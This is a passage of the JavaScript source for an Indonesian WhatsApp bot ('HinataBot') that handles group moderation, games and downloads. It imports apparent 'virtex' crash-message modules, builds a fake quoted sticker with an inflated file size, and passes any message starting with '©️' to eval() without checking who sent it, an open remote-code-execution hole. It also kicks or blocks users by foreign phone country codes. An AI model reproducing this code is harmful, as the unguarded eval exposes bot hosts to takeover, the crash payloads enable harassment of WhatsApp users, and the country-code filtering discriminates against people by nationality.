require('./config')
require('./listmenu')
require('./HinataBase/antisipasi/hinata')
const { modul } = require('./module')
const { baileys, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, delay } = global.baileys
const { fs, util, chalk, os, axios, fsx, fetch, cheerio, crypto, ffmpeg, fg, ytdl, moment, FormData, jsdom, maker, hinataprimbon, speed, hinataopenai, hinatachild, jsobfus, googleTTS, PhoneNumber } = modul
const { createHash } = crypto
const { JSDOM } = jsdom
const { Primbon } = hinataprimbon
const { Configuration, OpenAIApi } = hinataopenai
const { exec, spawn, execSync } = hinatachild
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./HinataBase/lib/color')
const { uptotelegra } = require('./HinataBase/lib/upload')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./HinataBase/lib/list')
const { rentfromhinata, conns } = require('./hinataserversewa')
const primbon = new Primbon()
const { ngazap }= require('./HinataBase/virtex/ngazap')
const { buttonkal } = require('./HinataBase/virtex/buttonkal')
const { cttl }= require('./HinataBase/virtex/cttl')
const { tizi } = require('./HinataBase/virtex/tizi')
const { weg } = require('./HinataBase/virtex/weg')
const { virtex7 } = require('./HinataBase/virtex/virtex7')
const ffstalk = require('./HinataBase/scrape/ffstalk')
const githubstalk = require('./HinataBase/scrape/githubstalk')
const npmstalk = require('./HinataBase/scrape/npmstalk')
const mlstalk = require('./HinataBase/scrape/mlstalk')
const photooxy = require('./HinataBase/scrape/photooxy')
const { fetchBuffer } = require('./HinataBase/lib/myfunc2')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, formatp } = require('./HinataBase/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// Read database
global.db.data = JSON.parse(fs.readFileSync('./HinataBase/database/database.json'))
if (global.db.data) global.db.data = {
    sticker: {},
    database: {}, 
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {})
}
if (global.db) setInterval(async () => {
    if (global.db.data) await global.db.write()
}, 30 * 1000)
let vote = db.data.others.vote = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebaklagu = db.data.game.tebaklagu = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
//=================================================//
const thumbnail = fs.readFileSync ('./HinataBase/image/hina.png')
const thumb = fs.readFileSync ('./HinataBase/image/hina.png')
const banerimage = fs.readFileSync ('./HinataBase/image/hinata.png')
const pengguna = JSON.parse(fs.readFileSync('./HinataBase/database/user.json'))
const sewa = JSON.parse(fs.readFileSync('./HinataBase/database/sewa.json'))
const owner = JSON.parse(fs.readFileSync('./HinataBase/database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./HinataBase/database/premium.json'))
const vnnye = JSON.parse(fs.readFileSync('./HinataBase/database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./HinataBase/database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./HinataBase/database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./HinataBase/database/apk.json'))
const BadHinata = JSON.parse(fs.readFileSync('./HinataBase/database/bad.json'))
const ntnsfw = JSON.parse(fs.readFileSync('./HinataBase/database/nsfw.json'))
const nttoxic = JSON.parse(fs.readFileSync('./HinataBase/database/antitoxic.json'))
const banned = JSON.parse(fs.readFileSync('./HinataBase/database/banned.json'))
const ntilinkall = JSON.parse(fs.readFileSync('./HinataBase/database/antilinkall.json'))
const ntlinkgc = JSON.parse(fs.readFileSync('./HinataBase/database/antilinkgc.json'))
const ntwame = JSON.parse(fs.readFileSync('./HinataBase/database/antiwame.json'))
const hpspromo = JSON.parse(fs.readFileSync('./HinataBase/database/hapuspromo.json'))
const ntvirtex = JSON.parse(fs.readFileSync('./HinataBase/database/antivirus.json'))
const wlcm = JSON.parse(fs.readFileSync('./HinataBase/database/wellcome.json'))
const ntibule = JSON.parse(fs.readFileSync('./HinataBase/database/antibule.json'))
const antidel = JSON.parse(fs.readFileSync("./HinataBase/database/antidel.json"))
const db_respon_list = JSON.parse(fs.readFileSync('./HinataBase/database/list.json'))
const seller = JSON.parse(fs.readFileSync('./HinataBase/database/seller.json'))
virgam = fs.readFileSync(`./HinataBase/image/deden.jpeg`)
//=================================================//
module.exports = hinata = async (hinata, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '.' : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await hinata.decodeJid(hinata.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPrem = prem.includes(m.sender)
const isBan = banned.includes(m.sender)
const isSewa = sewa.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const isSeller = seller.includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await hinata.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const antiToxic = m.isGroup ? nttoxic.includes(from) : false
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
const antiWame = m.isGroup ? ntwame.includes(from) : false
const HpsPromo = m.isGroup ? hpspromo.includes(from) : false
const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiBule = m.isGroup ? ntibule.includes(from) : false
const autodelete = from && isCmd ? antidel.includes(from) : false
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const xdate = moment.tz('Asia/Jakarta').format('DD');
const xjam = moment.tz('Asia/Jakarta').format('HH');
const xhari = moment().tz('Asia/Jakarta').locale('id').format('dddd')
const xbulan = moment().tz('Asia/Jakarta').locale('id').format('MMMM');
const xtahun = moment.tz('Asia/Jakarta').format('YYYY');
const qtod = m.quoted? "true":"false"
//=================================================//}
if(xjam == "01"){var hinataytimewisher = `Selamat Pagi 🌝`}
if(xjam == "02"){var hinataytimewisher = `Selamat Pagi 🌝`}
if(xjam == "03"){var hinataytimewisher = `Selamat Pagi 🌝`}
if(xjam == "04"){var hinataytimewisher = `Selamat Pagi 🌔`}
if(xjam == "05"){var hinataytimewisher = `Selamat Pagi 🌄`}
if(xjam == "06"){var hinataytimewisher = `Selamat Pagi 🌥️`}
if(xjam == "07"){var hinataytimewisher = `Selamat Pagi ⛅`}
if(xjam == "08"){var hinataytimewisher = `Selamat Pagi ⛅`}
if(xjam == "09"){var hinataytimewisher = `Selamat Siang ⛅`}
if(xjam == "10"){var hinataytimewisher = `Selamat Siang 🌤️`}
if(xjam == "11"){var hinataytimewisher = `Selamat Siang ☀️`}
if(xjam == "12"){var hinataytimewisher = `Selamat Siang ☀️`}
if(xjam == "13"){var hinataytimewisher = `Selamat Siang ☀️`}
if(xjam == "14"){var hinataytimewisher = `Selamat Siang 🌤️`}
if(xjam == "15"){var hinataytimewisher = `Selamat Sore 🌥️`}
if(xjam == "16"){var hinataytimewisher = `Selamat Sore 🌅`}
if(xjam == "17"){var hinataytimewisher = `Selamat Sore 🌅`}
if(xjam == "18"){var hinataytimewisher = `Selamat Sore 🌙`}
if(xjam == "19"){var hinataytimewisher = `Selamat Sore 🌙`}
if(xjam == "20"){var hinataytimewisher = `Selamat Sore 🌙`}
if(xjam == "21"){var hinataytimewisher = `Selamat Malam 🌙`}
if(xjam == "22"){var hinataytimewisher = `Selamat Malam 🌕`}
if(xjam == "23"){var hinataytimewisher = `Selamat Malam 🌕`}
if(xjam == "00"){var hinataytimewisher = `Selamat Pagi 🌕`}

// Limit
try {
    let isNumber = x => typeof x === 'number' && !isNaN(x)
    let user = global.db.data.users[m.sender]
    let limitUser = global.limiuser
    if (typeof user !== 'object') global.db.data.users[m.sender] = {}
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1
        if (!('afkReason' in user)) user.afkReason = ''
        if (!isNumber(user.limit)) user.limit = limitUser
    }
    else global.db.data.users[m.sender] = {
        afkTime: -1,
        afkReason: '',
        warn: 0,
        limit: limitUser,
        name: '',
        age: '',
        regTime: -1,
        registered: false
    }
// Reset Limit
    let cron = require('node-cron')
    cron.schedule('00 10 * * *', () => {
        let user = Object.keys(global.db.data.users)
        let limitUser = global.limiuser
        for (let jid of user) global.db.data.users[jid].limit = limitUser
        console.log('Reseted Limit')
    }, {
    scheduled: true,
    timezone: "Asia/Jakarta"
    })
    let setting = global.db.data.settings[botNumber]
    if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
    if (setting) {
        if (!isNumber(setting.status)) setting.status = 0
        if (!('autobio' in setting)) setting.autobio = true
    }
    else global.db.data.settings[botNumber] = {
        status: 0,
        autobio: true,
    }
} catch (err) {
    console.log(err)
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

const kalgans = {
    key: {
        fromMe: [], 
        participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
    },

    'message': {
        "stickerMessage": {
            "url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
            "fileSha256": "YEkt1kHkOx7vfb57mhhinataiu6ksRDxNzRBAxqZ5O461U=",
            "fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
            "mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
            "mimetype": "image/webp",
            "height": 40,
            "width": 40,
            "directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
            "fileLength": "99999999",
            "mediaKeyTimestamp": "16572901099967",
            'isAnimated': []
        }
    }
}

const reply = (teks) => {
  return hinata.sendMessage(from, { text: teks, contextInfo:{ "externalAdReply": { "title": `${botname}`, "body": `Halo ${pushname}, ${hinataytimewisher}`, "previewType": "PHOTO", "thumbnail": thumb}}}, { quoted:m})
}

const hinatamsg = (teks) => {
  return hinata.sendMessage(from, { text: teks, mentions:[sender], contextInfo:{mentionedJid:[sender], "externalAdReply": { "showAdAttribution": true, "renderLargerThumbnail": true, "title": `${botname}`, "body": `Halo ${pushname}, ${hinataytimewisher}`, "previewType": "PHOTO", "containsAutoReply": true, "mediaType": 1, "thumbnail": banerimage}}}, { quoted:m})
}

function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

async function sendPoll(jid, text, list) {
    hinata.relayMessage(jid, {
        "pollCreationMessage": {
            "name": text,
            "options": list.map(v => { return { optionName: v } }),
            "selectableOptionsCount": list.length
        }
    }, {})
}

async function loading () {
    hinatadientod = ["    ○○●ʟᴏᴀᴅɪɴɢ●○○\n██▒▒▒▒▒▒▒▒▒▒▒▒ 5%", "    ○●○ʟᴏᴀᴅɪɴɢ○●○\n████▒▒▒▒▒▒▒▒▒▒ 25%", "    ●○○ʟᴏᴀᴅɪɴɢ○○●\n███████▒▒▒▒▒▒▒ 40%", "    ○●○ʟᴏᴀᴅɪɴɢ○●○\n██████████▒▒▒▒ 75%", "    ○○●ʟᴏᴀᴅɪɴɢ●○○\n██████████████ 100%", "ᴄᴏᴍᴘʟᴇᴛᴇᴅ..."]
    let { key } = await hinata.sendMessage(from, {text: '    ○○●ᴡᴀɪᴛɪɴɢ●○○\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%'})//Pengalih isu
    for (let i = 0; i < hinatadientod.length; i++) {
        await hinata.sendMessage(from, {text: hinatadientod[i], edit: key });//PESAN LEPAS
    }
}

const downloadMp3 = async (Link) => {
try {
    await ytdl.getInfo(Link)
    let mp3File = getRandom('.mp3')
    console.log(color('Download Audio With ytdl-core'))
    ytdl(Link, { filter: 'audioonly' })
    .pipe(fs.createWriteStream(mp3File))
    .on('finish', async () => {
        await hinata.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
        fs.unlinkSync(mp3File)
        })
    } catch (err) {
    m.reply(`${err}`)
    }
}

async function ephoto(url, texk) {
    let form = new FormData 
    let gT = await axios.get(url, {
        headers: {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }
    })
    let $ = cheerio.load(gT.data)
    let text = texk
    let token = $("input[name=token]").val()
    let build_server = $("input[name=build_server]").val()
    let build_server_id = $("input[name=build_server_id]").val()
    form.append("text[]", text)
    form.append("token", token)
    form.append("build_server", build_server)
    form.append("build_server_id", build_server_id)
    let res = await axios({
    url: url,
    method: "POST",
    data: form,
        headers: {
            Accept: "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"]?.join("; "),
            ...form.getHeaders()
        }
    })
    let $$ = cheerio.load(res.data)
    let json = JSON.parse($$("input[name=form_value_input]").val())
    json["text[]"] = json.text
    delete json.text
    let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
        headers: {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; ")
        }
    })
    return build_server + data.image
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
    try {
        const obfuscationResult = jsobfus.obfuscate(query, { compact: false, controlFlowFlattening: true, controlFlowFlatteningThreshold: 1, numbersToExpressions: true, simplify: true, stringArrayShuffle: true, splitStrings: true, stringArrayThreshold: 1 })
        const result = { status: 200, author: `${ownername}`, result: obfuscationResult.getObfuscatedCode() }
        resolve(result)
        } catch (e) {
            reject(e)
        }
    })
}

const hinatareplyprem = () => {
    m.reply(`Anda bukan pengguna Premium 😏`)
}

const hinatareplyban = () => {
    m.reply(`Anda telah di ban! ⚠️`)
}

const hinatareplyowner = () => {
    m.reply(`Hanya untuk owner bot! 👨‍💻`)
}

const hinatareplyadmin = () => {
    m.reply(`Hanya untuk Admin! 👮‍♂️`)
}

const hinatareplygrouponly = () => {
    m.reply(`Hanya untuk Grup! 🚫`)
}

const hinatareplypribadi = () => {
    m.reply(`Lakukan pada obrolan Pribadi.. 👥`)
}

const hinatareplybotadmin = () => {
    m.reply(`Bot harus menjadi admin! 🚫`)
}

const hinatareplyseller = () => {
    m.reply(`Hanya untuk penjual🛍️`)
}

const hinatansfw = () => {
    m.reply(`Fitur 🔞 Belum di aktifkan🤦\n\nAktifkan dengan cara ketik perintah *.nsfw on*`)
}

const HinataReg = () => {
    m.reply('🔒 Anda belum melakukan Registrasi\nOleh karena itu anda tidak bisa menggunakan fitur dari bot ini\n\n🔓 Segera lakukan Registrasi dengan cara mengetik : *.reg nama.usia*\n\n📌 *Contoh :* .reg Hinata.25')
}
//BATAS
//
//=================================================//
//chat counter (console log)
if (isCmd && m.isGroup) {
    hinata.readMessages([m.key])
    console.log(color(`\n▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n`, 'cyan'))
    console.log(color(`Pesan Grup:`, 'green'))
    console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(groupName, m.chat))
}

if (isCmd && !m.isGroup) {
    hinata.readMessages([m.key])
    console.log(color(`\n▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n`, 'cyan'))
    console.log(color(`Pesan Pribadi:`, 'magenta'))
    console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender))
}

if (!hinata.public) {
    if (!m.key.fromMe) return
}

if (global.autoTyping) {
    if (command) {
        hinata.sendPresenceUpdate('composing', from)
    }
}

if (global.hideBotOnline) {
    if (command) {
        hinata.sendPresenceUpdate('unavailable', from)
    }
}

if (global.autoRecord) {
    if (command) {
        hinata.sendPresenceUpdate('recording', from)
    }
}

// Anti Deleted
if (autodelete) {
    hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: mek.key.id, participant: mek.key.participant}})
}

//autoblock nokos
if (global.autoblocknokos) {
    if (!m.isGroup && m.sender.startsWith("212", "265", "234", "258", "263", "967", "20", "92", "91")) {
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️ 」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf nomor anda kami blokir ⛔\nKarena system kami mendeteksi pesan mencurigakan\n\n\n~_*©Hͥ̽ͣ̃̔ỉ͔͖̜͌ṇ̤͛̒̍ā̤̓̍͘t̲̂̓ͩ̑ā̤̓̍͘B̩͎͍̾ͅo̯̱̊͊͢t̲̂̓ͩ̑*_~`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
        hinata.updateBlockStatus(m.sender, 'block')
    }
}

// Anti Promosi
if (HpsPromo) {
    if (m.isGroup && budy.match(`${global.antipromos}`)) {
        if (!isBotAdmins) return hinatareplybotadmin()
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\n\nKalau mau jualan jangan di sini ya..\nYa setidaknya Promosikan di Grup sendiri lah🤗\n\nTerima Kasih.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
        let user = global.db.data.users[m.sender]
        user.warn += 1
    }
}

// ᴀɴᴛɪ ᴛᴏxɪᴄ
if (antiToxic) {
if (!isBotAdmins) return hinatareplybotadmin()
    if (BadHinata.includes(messagesD)) {
        if (m.text) {
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\nKarena anda terdeteksi menggunakan kata kata kasar / terlarang di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
    }
    else if (budy.match(`${global.toxicbngt}`)) {
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\nKarena anda terdeteksi menggunakan kata kata kasar / terlarang di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
    }
}

// ᴀɴᴛɪ ʟɪɴᴋ
if (AntiLinkAll) {
    if (m.isGroup && budy.match(`https://|http://|www.`)){
        if (!isBotAdmins) return hinatareplybotadmin()
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️ 」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\nKarena di grup ini tidak boleh membagikan semua link`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
        let user = global.db.data.users[m.sender]
        user.warn += 1
    }
}

// Anti Link GC
if (Antilinkgc) {
    if (m.isGroup && budy.match(`chat.whatsapp.com|https://chat.whatsapp.com`)) {
        if (!isBotAdmins) return hinatareplybotadmin()
        let gclink = (`https://chat.whatsapp.com/`+await hinata.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return
        if (isAdmins) return
        if (isCreator) return
        kice = m.sender
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️ 」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\nKarena anda membagikan link Grup di sini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        let user = global.db.data.users[m.sender]
        user.warn += 1
    }
}

// Anti link wa.me
if (antiWame) {
    if (m.isGroup && budy.match(`wa.me|http://wa.me`)) {
        if (!isBotAdmins) return hinatareplybotadmin()
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        kice = m.sender
        await hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️ 」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\nMohon maaf pesan anda kami hapus ⛔\nKarena anda membagikan link wa.me di sini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        let user = global.db.data.users[m.sender]
        user.warn += 1
    }
}

// Anti Virus / Bug
if (antiVirtex) {
    if (m.isGroup && budy.length > 3500) {
        if (!isBotAdmins) return hinatareplybotadmin()
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        await hinata.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    }
}

// Anti Bule
if (AntiBule) {
    if (m.isGroup && m.sender.startsWith(`212|265|234|258|263|967|20|92|91|55`)) {
        if (!isBotAdmins) return hinatareplybotadmin()
        if (isAdmins) return
        if (m.key.fromMe) return
        if (isCreator) return
        hinata.sendMessage(from, {text:`\`\`\`「⚠️ Peringatan ⚠️ 」\`\`\`\n\n\nHalo @${m.sender.split("@")[0]}\n${hinataytimewisher}\n\n🚨 System kami mendeteksi pesan mencurigakan\nMohon maaf anda akan otomatis kami keluarkan dari grup dalam waktu 15 detik ⛔\n\n\n~_*©Hͥ̽ͣ̃̔ỉ͔͖̜͌ṇ̤͛̒̍ā̤̓̍͘t̲̂̓ͩ̑ā̤̓̍͘B̩͎͍̾ͅo̯̱̊͊͢t̲̂̓ͩ̑*_~`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
        await delay(15000)
        hinata.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    }
}

if (global.uselimit) {
    let who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hinata.user.jid : m.sender
    let user = global.db.data.users[who]
    if (!(who in global.db.data.users)) return
    let limit = global.db.data.users[who]
    if (m.sender && !isPrem && !m.isGroup) {
        if (limit === 1) return m.reply(`[❗] Batas limit harian kamu sudah habis,\nLimit akan di setel ulang dalam waktu 24 jam`)
    }
    if (m.sender && isCmd && !isPrem && m.isGroup) {
        if (limit === 1) return m.reply(`[❗] Batas limit harian kamu sudah habis,\nLimit akan di setel ulang dalam waktu 24 jam`)
    }
    if (isCmd && !isPrem && (user = global.db.data.users[m.sender])) {
        user.limit -= 1
    }
}

if (m.sender && m.isGroup && !isAdmins) {
    let user = global.db.data.users[m.sender]
    if (user.warn === global.maxwarn) {
        m.reply(`\`\`\`「 ⚠️PERINGATAN⚠️ 」\`\`\`

Halo ${pushname}
${hinataytimewisher}

Mohon maaf anda akan akan di keluarkan dari grup dalam waktu 10 detik
Karena anda sudah di beri peringatan sebanyak 3x [❗]`)
        user.warn = 0
        await delay(10000)
        await hinata.groupParticipantsUpdate(from, [m.sender], 'remove')
    }
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
    let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
    let { text, mentionedJid } = hash
    let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
        userJid: hinata.user.id,
        quoted : m.quoted && m.quoted.fakeObj
    })
    messages.key.fromMe = areJidsSameUser(m.sender, hinata.user.id)
    messages.key.id = m.key.id
    messages.pushName = m.pushName
    if (m.isGroup) messages.participant = m.sender
    let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: 'append'
    }
    hinata.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
    try {
        return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
    } catch (e) {
    reply(e)
    }
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await hinata.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendapk = (teks) => {
    hinata.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
    m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk Mobile Legend*')
}
for (let ikalii of apknye) {
    if (budy === ikalii) {
        let buffer = fs.readFileSync(`./HinataBase/database/apk/${ikalii}.apk`)
        sendapk(buffer)
    }
}
//=================================================//
const sendzip = (teks) => {
